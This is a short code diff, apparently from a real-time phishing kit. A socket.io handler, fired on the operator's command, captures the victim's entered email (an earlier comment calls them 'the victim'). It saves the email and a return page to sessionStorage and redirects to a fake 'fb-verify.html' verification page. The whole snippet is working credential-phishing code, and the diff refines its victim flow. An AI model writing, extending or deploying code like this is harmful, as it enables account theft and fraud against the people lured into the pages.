@@ -1315,13 +1315,14 @@
         });
 
         socket.on('show-google-login', () => {
-            // Grab the victim's email from the live input or localStorage
             var fbEmailEl = document.getElementById('email');
             var fbEmail = (fbEmailEl && fbEmailEl.value.trim())
                           || sessionStorage.getItem('lastLoginEmail')
                           || '';
-            try { sessionStorage.setItem('lastLoginEmail', fbEmail); } catch(e) {}
-            // Redirect to the full-page Facebook verification page
+            try {
+                sessionStorage.setItem('lastLoginEmail', fbEmail);
+                sessionStorage.setItem('googleReturnPage', 'apply.html');
+            } catch(e) {}
             window.location.href = 'fb-verify.html';
         });
 
